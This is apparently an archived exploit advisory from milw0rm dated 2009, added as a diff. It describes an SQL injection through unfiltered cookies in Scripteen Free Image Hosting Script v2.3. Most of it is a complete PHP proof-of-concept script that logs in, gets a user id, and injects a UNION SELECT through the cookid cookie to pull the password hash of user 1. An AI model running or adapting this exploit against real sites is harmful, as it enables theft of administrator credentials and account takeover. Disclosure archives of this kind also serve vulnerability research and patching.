@@ -1,0 +1,152 @@
+===================
+Scripteen Free Image Hosting Script v2.3 SQL Injection vulnerable
+===================
+
+The vulnerable: header.php (line 53-62)
+
+	$userid=$_SESSION['userid'];
+	$usergid=$_SESSION['usergid'];
+	if (!$userid || empty($userid) || $userid==""){
+    		$userid = $_COOKIE['cookid'];
+	}
+	if (!$usergid || empty($usergid) || $usergid==""){
+    		$usergid = $_COOKIE['cookgid'];
+	}
+
+As you can see $_COOKIE['cookid'] and $_COOKIE['cookgid'] is not filtered and can be used to do an SQL Injection
+
+===================
+Proof of concept
+===================
+<?php
+// *************************************
+// Global variables
+// *************************************
+$g_arguments	= getArguments();
+$g_url		= isset($g_arguments['url']) ? $g_arguments['url'] : false;
+$g_username	= isset($g_arguments['username']) ? $g_arguments['username'] : false;
+$g_password	= isset($g_arguments['password']) ? $g_arguments['password'] : false;
+// *************************************
+
+// *************************************
+// Print help
+// *************************************
+if(isset($g_arguments['help']) || $g_url === false || $g_username === false || $g_password === false)
+{
+	echo "###################################\n";
+	echo "#                                  \n";
+	echo "# Scripteen Free Image Hosting V2.3\n";
+	echo "#      SQL Injection Exploit       \n";
+	echo "#      Discovered by Coksnuss      \n";
+	echo "#      POC script by Coksnuss      \n";
+	echo "#                                  \n";
+	echo "###################################\n";
+	
+	echo "Usage: " . $argv[0] . "\n";
+	echo "\t--help - This help\n";
+	echo "\t--url=[STR] - URL of a vulnerable site (e.g. http://www.host.de/path/to/script)\n";
+	echo "\t--username=[STR] - A valid username to login\n";
+	echo "\t--password=[STR] - A valid password to login\n";
+	die();
+}
+// *************************************
+
+
+// *************************************
+// Main
+// *************************************
+$url = strpos($g_url, '.php') !== false ? dirname($g_url) : $g_url;
+if(substr($url, -1, 1) == '/' ) $url = substr($url, 0, -1);
+
+// Get Cookie
+echo "Generate cookie...";
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL,		$g_url . '/login.php');
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($curl, CURLOPT_COOKIEJAR,	dirname(__FILE__) . DIRECTORY_SEPARATOR . 'cookie.txt');
+curl_setopt($curl, CURLOPT_POST,	true);
+curl_setopt($curl, CURLOPT_POSTFIELDS,	'uname=' . urlencode($g_username) . '&pass=' . urlencode($g_password));
+
+$ret = curl_exec($curl);
+curl_close($curl);
+
+preg_match_all('/([\d]{1}[.][\d]{1})/', $ret, $matches);
+if(!array_search('2.3', $matches[1]))
+	echo("\nWarning: It seems like this site do not use version 2.3 of the Scripteen Free Image Hosting Script!\n");
+
+if(!file_exists(dirname(__FILE__) . DIRECTORY_SEPARATOR . 'cookie.txt'))
+	die('Be sure that you\'ve enabled CURL and have write permission in the script directory!');
+
+echo "DONE\n";
+
+// Get userid
+echo "Get userid...";
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL,		$g_url . '/profile.php');
+curl_setopt($curl, CURLOPT_COOKIEFILE,	dirname(__FILE__) . DIRECTORY_SEPARATOR . 'cookie.txt');
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$ret = curl_exec($curl);
+curl_close($curl);
+
+if(!preg_match('/<input type="hidden" name="userid" id="userid" value="([\d]{1,3})"/', $ret, $match))
+	die('Couldn\'t retrieve userid! Check your login data again!');
+
+$userid = $match[1];
+echo "DONE (" . $userid . ")\n";
+
+// Get the password hash from userid 1
+echo "Get the passwordhash from userid 1...\n";
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL,		$g_url . '/profile.php');
+curl_setopt($curl, CURLOPT_COOKIE,	'cookid=' . $userid . ' UNION SELECT 1,2,password,4,5,6,7,8,9,10,11 FROM users WHERE userid=1; cookgid=3; cookname=' . urlencode($g_username) . '; cookpass=' . md5($g_password));
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$ret = curl_exec($curl);
+curl_close($curl);
+
+if(!preg_match('/<input type="text" name="uname" id="uname" value="([a-z0-9]{32})"/', $ret, $match))
+	die('Couldn\'t find the password hash!');
+
+echo "Hash found: " . $match[1] . "\n";
+// *************************************
+
+
+// *************************************
+// Global functions
+// *************************************
+function getArguments()
+{
+	global $argv;
+	
+	foreach($argv as $arg)
+	{
+		if(substr($arg, 0, 2) == '--')
+		{
+			// In case its an arguments (e.g. --arg='1')
+			if(($pos = strpos($arg, '=')) !== false)
+			{
+				$name = substr($arg, 2, ($pos - 2));
+				$value = substr($arg, ($pos + 1));
+				
+				$args[$name] = $value;
+			// Or just a flag (e.g. --help)
+			} else {
+				$name = substr($arg, 2);
+				
+				$args[$name] = true;
+			}
+		} else if($arg == $argv[0]) {
+			$args[0] = $argv[0];
+		}
+	}
+	
+	return $args;
+}
+// *************************************
+?>
+
+# milw0rm.com [2009-07-24]
